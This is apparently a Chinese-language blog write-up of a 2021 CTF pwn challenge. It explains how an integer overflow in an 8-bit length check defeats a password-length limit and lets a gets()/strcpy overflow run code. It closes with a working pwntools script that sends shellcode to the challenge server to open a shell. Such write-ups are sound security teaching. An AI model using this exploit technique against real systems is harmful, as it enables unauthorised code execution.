---
title: 「TSCTF-J_2021」Pwn - Int_Or_Char WriteUp
date: 2021-10-30
tags: ['TSCTF-J_2021', 'Pwn', 'writeup', 'wp']
authors: [nova]
---

## 题目

### 初步确定思路

使用`checksec`查看一下文件，发现并没有开启NX和PIE，则初步考虑ret2text和ret2shellcode

![checksec](https://cdn.ova.moe/img/image-20211025175327904.png)

<!--truncate-->

### 分析代码

直接跳到`pwn()`函数开始看吧

```c
int pwn()
{
  char s[50]; // [esp+Dh] [ebp-3Bh] BYREF
  unsigned __int8 v2; // [esp+3Fh] [ebp-9h]

  puts("Plz input ur passwd:");
  puts("Tip: The passwd length needs to be between 4 and 8 characters");
  gets(s);
  v2 = strlen(s);
  return check(v2, s);
}
```

注意到`gets(s)`并没有限定长度，可以考虑在这里栈溢出。

来到`check(v2, s)`函数

```c
char *__cdecl check(int a1, char *src)
{
  if ( (unsigned __int8)a1 <= 3u || (unsigned __int8)a1 > 8u )
  {
    puts("So bad!");
    puts("The passwd length needs to be between 4 and 8 characters");
    exit(0);
  }
  puts("good length!");
  return strcpy(passwd_buf, src);
}
```

这里要求我们的长度`a1 > 3 && a1 <= 8`，如果是这样的话我们很明显无法构造出我们想要的payload, 这里可以参考攻防世界的[Int_Overflow](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5058&page=1)的writeups提到的**整数溢出漏洞**

> 一个通俗易懂的C语言例子
>
> 对于一个`2字节的unsigned short int型变量`，当它的数据长度超过2字节时，就会溢出，使用的数据也仅仅是最后两个字节
>
> ```c
> int main()
> {
> unsigned short int var1 = 1, var2 = 257; //var1 = 0x
> if (var1 == var2)
> {
> printf("溢出");
> }
> return 0;
> }
> ```
>
> ```shell
> Out:
> 	溢出
> ```

回到我们这题， 我们的`v2`是一个`unsigned __int8`的变量, 这意味着它的取值范围只有`0~255`那如果我们传入一个长度为*256*的数据，`v2`的值其实就变成了*1*(255 + 1), 这样一来，我们传入的长度可以到`(255+4)~(255+8)`也就是*259-263*个字符。

好的，绕过了字符长度检查，接下来又应该怎么利用这个漏洞呢？

```c
char *strcpy(char *dest, const char *src);
```

这是`strcpy`的原型, 也就是说, `src`的内容会拷贝到`dest`所在的地址上，也就是题目中的`passwd_buf`处

![passwd_buf地址](https://cdn.ova.moe/img/image-20211025194709773.png)

我们来看一下栈堆

![stack of check](https://cdn.ova.moe/img/image-20211025192814285.png)

这里我贴上Mark大爹的讲解：

![性感Mark在线教学](https://cdn.ova.moe/img/image-20211025192651649.png)

> 理解较浅，原因什么的按下不表，等我去把Pwn入门了把栈整明白了再说（）

前面提到，因为NX没开，所以我们的buf是**可执行**的，这也给了我们使用`shellcode`的条件，而且我们并没有调用系统指令的函数存在，因此必须糙一个shellcode出来

```python
from pwn import *

context(os='linux', arch='i386', log_level='debug') # 指定了目标是32位系统, 下文

shellcode = asm(shellcraft.sh()) # 生成shellcode
buf_addr = 0x804A060 # buf地址
# print(shellcode)

payloadd = shellcode.ljust(0x3b, b'A') + b'A'*4 + p32(buf_addr) # 我们先把shellcode左对齐到栈底，再加上4字节的数据干掉rbp, 再加上p32(buf_addr) 即可跳转到buf_addr执行，也就是我们的shellcode
payloadd = payloadd + b'A'*(262-len(payloadd)) # 补齐payload以实现整数溢出漏洞
# print(len(payloadd))
# print(payloadd)
p = remote("45.82.79.42", 11001)

p.recvuntil("characters")
p.sendline(payloadd)
p.interactive()
# 此时已经拿到了shell, 该干什么就不用多说了8

```

> 在本WriteUp编写之前服务器已经shutdown了，所以没有获得shell之后的过程啦

### 个人总结

虽然在做这题的时候虽然整数溢出这个很快就实现了，如何运行shellcode却卡了很久（原因就是到达了栈底之后还要覆盖掉rbp才能跳转，在这之前我完全不理解为什么）

Pwn真是太有意思辣

## 参考资料

[ret2shellcode](https://blog.csdn.net/qq_45691294/article/details/111387593)

Mark大爹
